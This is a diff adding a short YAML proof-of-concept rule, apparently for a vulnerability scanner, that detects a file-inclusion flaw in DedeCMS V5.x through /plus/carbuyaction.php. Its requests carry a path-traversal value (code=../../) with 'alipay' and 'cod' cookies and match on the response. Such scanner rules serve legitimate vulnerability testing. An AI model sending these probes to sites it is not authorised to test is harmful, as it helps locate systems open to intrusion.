@@ -1,0 +1,22 @@
+name: poc-yaml-dedecms-carbuyaction-fileinclude
+rules:
+  - method: GET
+    path: /plus/carbuyaction.php?dopost=return&code=../../
+    headers:
+      Cookie: code=alipay
+    follow_redirects: true
+    expression: |
+      response.status == 200
+  - method: GET
+    path: /plus/carbuyaction.php?dopost=return&code=../../
+    headers:
+      Cookie: code=cod
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes("Cod::respond()"))
+
+detail:
+  author: harris2015(https://github.com/harris2015)
+  Affected Version: "DedeCmsV5.x"
+  links:
+    - https://www.cnblogs.com/milantgh/p/3615986.html
